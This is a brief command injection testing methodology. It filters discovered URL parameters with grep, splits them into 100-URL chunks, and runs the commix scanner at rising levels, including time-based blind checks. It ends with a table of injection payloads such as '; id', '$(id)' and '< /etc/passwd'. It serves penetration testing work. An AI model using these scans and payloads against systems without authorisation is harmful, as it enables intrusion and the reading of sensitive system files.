Command Injection (CMDi)

OS command injection testing methodology with controlled chunks scanning.

Requirements

Required: parameter.txt must exist (combined output from ParamSpider / Arjun / FFUF).

The goal is to reduce noise, scan safely, and test CMD injection in controlled chunks of 100 URLs.

CMD Injection Workflow

Step 1: Filter CMDi-Relevant Parameters

Filter parameters that commonly lead to command injection:

grep -Ei "ip|host|ping|cmd|exec|shell|run|query" parameter.txt > cmdi_all.txt

Step 2: Remove Duplicates

sort -u cmdi_all.txt > cmdi_unique.txt

Step 3: Keep Only Valid Parameterized URLs

grep "=" cmdi_unique.txt > cmdi_final.txt

Step 4: Split into Chunks (100 URLs per file)

Example output files: cmdi_aa, cmdi_ab, cmdi_ac...

split -l 100 cmdi_final.txt cmdi_

Step 5: Safe Initial Detection Scan (Fast, Low Noise)

commix -m /path/to/cmdi_aa --batch --level=1

Step 6: Deeper Confirmation Scan

commix -m /path/to/cmdi_aa --batch --level=2

Step 7: Blind / Time-Based CMD Injection (Last Option)

commix -m /path/to/cmdi_aa --batch --level=3 --technique=t

Step 8: Move to Next 100 URLs

commix -m /path/to/cmdi_ab --batch --level=1

Step 9: Save Detailed Results

commix -m /path/to/cmdi_aa --batch --level=2 --output-dir=commix_results

Recommended Flow

level=1 → level=2 → level=3 (only if needed)

Common CMDi Payloads

Type Payload
Semicolon ; id
AND Operator && id
OR Operator || id
Pipe | id
Backticks `id`
Dollar $(id)
Redirect < /etc/passwd
